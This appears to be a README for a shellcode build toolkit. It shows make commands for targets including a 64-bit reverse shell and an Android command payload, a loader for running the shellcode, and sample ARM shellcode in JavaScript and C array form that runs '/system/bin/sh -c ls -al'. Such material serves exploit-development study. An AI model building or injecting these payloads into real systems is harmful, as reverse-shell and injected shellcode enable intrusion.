## Make Shellcode

* build shellcode:

```shell
make shellcode T=linux.reverse64IPv4
or
make shellcode T=android.cmd32
```

* build elf for run shellcode:

```shell
make run T=linux
or
make run T=arm
```

* run shellcode:

```
./run ./shellcode
```

you can run `./shellcode.elf` directly for android shellcode.


* shellcode to array:

```shell
╭─ 
╰─ python ./tools/s2a.py shellcode

var JavaScript_shellcode = new Uint8Array([
    0x1c, 0x00, 0x8f, 0xe2, 0x27, 0x50, 0x8f, 0xe2,
    0x26, 0x60, 0x8f, 0xe2, 0x00, 0x80, 0xa0, 0xe3,
    0x61, 0x01, 0x2d, 0xe9, 0x0d, 0x10, 0xa0, 0xe1,
    0x00, 0x20, 0xa0, 0xe3, 0x0b, 0x70, 0x00, 0xe3,
    0x00, 0x00, 0x00, 0xef, 0x2f, 0x73, 0x79, 0x73,
    0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x00, 0x2d, 0x63, 0x00, 0x6c, 0x73,
    0x20, 0x2d, 0x61, 0x6c, 0x00, 0x00, 0x00, 0x00,
])
char C_shellcode[] =
    "\x1c\x00\x8f\xe2\x27\x50\x8f\xe2"
    "\x26\x60\x8f\xe2\x00\x80\xa0\xe3"
    "\x61\x01\x2d\xe9\x0d\x10\xa0\xe1"
    "\x00\x20\xa0\xe3\x0b\x70\x00\xe3"
    "\x00\x00\x00\xef\x2f\x73\x79\x73"
    "\x74\x65\x6d\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x00\x2d\x63\x00\x6c\x73"
    "\x20\x2d\x61\x6c\x00\x00\x00\x00"

```

## refs

[Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes)

[Shellcodes database for study cases](http://shell-storm.org/shellcode/)

[Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
